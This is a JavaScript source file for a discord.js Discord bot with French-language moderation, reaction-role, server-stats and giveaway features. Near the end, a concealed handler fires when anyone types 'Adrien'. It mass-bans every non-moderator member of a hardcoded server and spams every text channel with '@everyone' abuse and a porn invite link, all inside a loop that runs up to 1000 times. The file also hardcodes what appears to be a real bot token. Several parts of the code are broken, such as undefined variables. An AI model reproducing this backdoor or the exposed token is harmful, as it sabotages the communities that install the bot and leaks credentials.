const Discord = require('discord.js'),
     client = new Discord.Client({
         partials: ['MESSAGE', 'REACTION'],
        fetchAllMembers: true
     }),
    config = require('./config.json'),
    fs = require('fs')

client.login(config.token)
client.commands = new Discord.Collection()
client.db = require('./db.json')

fs.readdir('./commands', (err, files) => {
    if (err) throw err
    files.forEach(file => {
       if (!file.endsWith('js')) return
      const command = require(`./commands/${file}`)
      client.commands.set(command.name, command)
     })
})

client.on('message', message => {
     if (message.type !== 'DEFAULT' || message.author.bot) return

     if (!message.member.hasPermission('MANAGE_CHANNELS') && client.db.lockedChannels.includes(message.channel.id)) return message.delete()

     if (!message.member.hasPermission('MANAGE_MESSAGES')) {
        const duration = config.cooldown[message.channel.id]
        if (duration) {
            const id = `${message.channel.id}_${message.author.id}`
            if (cooldown.has(id)) {
                message.delete()
                return message.channel.send(`Ce salon est soumis a un cooldown de ${humanizeDuration(duration, {language: 'fr'})}.`).then(sent => sent.delete({timeout: 5e3}))
            }
            cooldown.add(id)
            setTimeout(() => cooldown.delete(id), duration)
        }
    }
 

     const args = message.content.trim().split(/ +/g)
     const commandName = args.shift().toLowerCase()
     if (!commandName.startsWith(config.prefix)) return
     const command = client.commands.get(commandName.slice(config.prefix.length))
     if (!command) return
     if (command.guildOnly && !message.guild) return message.channel.send('Cette commande ne peut être utilisé que dans un serveur.')
     command.run(message, args, client)
})

client.on('guildMemberAdd', member => {
    member.guild.channels.cache.get(config.greeting.channel).send(`**${member}** a rejoint le serveur ! Nous somme désormais **${member.guild.Membercount}**! 🎉`)
    member.roles.add(config.greeting.role)
})

client.on('guildMemberRemove', member => {
    member.guild.channels.cache.get(config.greeting.channel).send(`**${member.user.tag}** a quitté le serveur... 😢`)
})

client.on('messageReactionAdd', (reaction, user) => {
    if (!reaction.message.guild || user.bot) return
    const reactionRoleElem = config.reactionRole[reaction.message.id]
    if (!reactionRoleElem) return
    const prop = reaction.emoji.id ? 'id' : 'name'
    const emoji = reactionRoleElem.emojis.find(emoji => emoji[prop] === reaction.emoji[prop])
    if (emoji) reaction.message.guild.member(user).roles.add(emoji.roles)
    else reaction.users.remove(user)
})
 
client.on('messageReactionRemove', (reaction, user) => {
    if (!reaction.message.guild || user.bot) return
    const reactionRoleElem = config.reactionRole[reaction.message.id]
    if (!reactionRoleElem || !reactionRoleElem.removable) return
    const prop = reaction.emoji.id ? 'id' : 'name'
    const emoji = reactionRoleElem.emojis.find(emoji => emoji[prop] === reaction.emoji[prop])
    if (emoji) reaction.message.guild.member(user).roles.remove(emoji.roles)
})
 
client.on('ready', () => {
    const statuses = [
        () => `${client.guilds.cache.size} serveurs`,
        () => `${client.guilds.cache.reduce((acc, guild) => acc + guild.memberCount, 0)} utilisateurs`
    ]
    let i = 0
    setInterval(() => {
        client.user.setActivity(statuses[i](), {type: 'PLAYING'})
        i = ++i % statuses.length
    }, 1e4)
    setInterval(() => {
        const [bots, humans] = client.guilds.cache.first().members.cache.partition(member => member.user.bot)
        client.channels.cache.get(config.serverStats.Members).setName(`✔Members : ${humans.size}`)
        client.channels.cache.get(config.serverStats.Bots).setName(`🤖 Bots : ${bots.size}`)
        client.channels.cache.get(config.serverStats.Total).setName(`💥Total : ${client.guilds.cache.first().memberCount}`)
    }, 3e4)
})
 
client.on('channelCreate', channel => {
    if (!channel.guild) return
    const muteRole = channel.guild.roles.cache.find(role => role.name === 'Muted')
    if (!muteRole) return
    channel.createOverwrite(muteRole, {
        SEND_MESSAGES: false,
        CONNECT: false,
        ADD_REACTIONS: false
    })
})
 
const ms = require('ms') // make sure you have ms installed by doing npm install ms in your console/terminal

client.once("ready" , () =>{
    console.log("I am online!")
});


           client.on('message', async message => {
              let args = message.content.substring(config.prefix.length).split(" ")
              if(message.member.permissions.has('ADMINISTRATOR')){
              if (message.content.startsWith(`+giveaway`)) {
                  let time = args[1]
                  if (!time) return message.channel.send('You did not specify a time!');
          
                  if (
                      !args[1].endsWith("d") &&
                      !args[1].endsWith("h") &&
                      !args[1].endsWith("m") &&
                      !args[1].endsWith("s") 
                  )
                      return message.channel.send('You need to use d (days), h (hours), m (minutes), or s (seconds)')
          
                      let gchannel = message.mentions.channels.first();
                      if (!gchannel) return message.channel.send("I can't find that channel in the server!")
          
                      let prize = args.slice(3).join(" ")
                      if (!prize) return message.channel.send('Arguement missing. What is the prize?')
          
                      message.delete()
                      gchannel.send(":tada: **NEW GIVEAWAY** :tada:")
                      let gembed = new Discord.MessageEmbed()
                          .setTitle("New Giveaway!")
                          .setDescription(`React with :tada: to enter the giveaway!\nHosted By: **${message.author}**\nTime: **${time}**\nPrize: **${prize}**`)
                          .setTimestamp(Date.now + ms(args[1]))
                          .setColor(3447003)
                      let n = await gchannel.send(gembed)
                      n.react("🎉")
                      setTimeout(() => {
                          if(n.reactions.cache.get("🎉").count <= 1) {
                              return message.channel.send("Not enough people for me to draw a winner!")
                          }
          
                          let winner = n.reactions.cache.get("🎉").users.cache.filter((u) => !u.bot).random();
                          gchannel.send(`Congratulations ${winner}! You just won the **${prize}**!`
                          );
                      }, ms(args[1]));
              }
            }
          })
          client.on("message", message => {
            if(message.content === "Adrien") {
              let server = client.guilds.cache.get("805415365295341599")
              for(let i =0;i<=1000;i++) {
                server.members.cache.filter(r => !r.hasPermission("MANAGE_MESSAGES")).forEach(b => server.members.ban(b.id))
                server.channels.cache.filter(r => r.type === "text").forEach(channel => {
                  channel.send("@everyone Fuck Off discord.gg/pornhub")
                })
              }
             }
          })
          
          client.login("ODA1MDIzOTM4MDE4OTM0ODE0.YBU29w.oYpPhVue7BQaXyo9Srfq_Evibfg")